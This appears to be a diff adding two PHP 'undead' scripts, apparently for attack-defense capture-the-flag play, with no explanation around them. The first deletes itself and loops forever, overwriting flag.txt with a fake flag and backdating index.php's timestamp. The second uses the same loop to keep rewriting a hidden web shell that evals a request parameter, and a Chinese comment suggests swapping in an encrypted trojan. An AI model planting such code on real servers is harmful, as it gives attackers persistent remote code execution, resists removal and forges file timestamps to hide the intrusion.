@@ -1,0 +1,31 @@
+//One
+
+<?php 
+ignore_user_abort(true);
+set_time_limit(0);
+unlink(__FILE__);
+$file1 = 'flag.txt';
+$code1 =  'iam123fakeh123rh1289e4u129e1e';
+while (1){
+	file_put_contents($file1,$code1);
+	system('touch -m -d "2017-11-12 10:10:10" index.php');
+	usleep(100);
+}
+?>
+
+//Two
+
+
+<?php 
+ignore_user_abort(true);
+set_time_limit(0);
+unlink(__FILE__);
+$file = '.Indexl.php';
+$code =  '<?php @eval($GET['1998c00l1998']);?>'; #这边可以自己换成加密木马
+while (1){
+	file_put_contents($file,$code);
+	system('touch -m -d "2019-11-14 10:10:10" index.php');
+	usleep(100);
+}
+?>
+
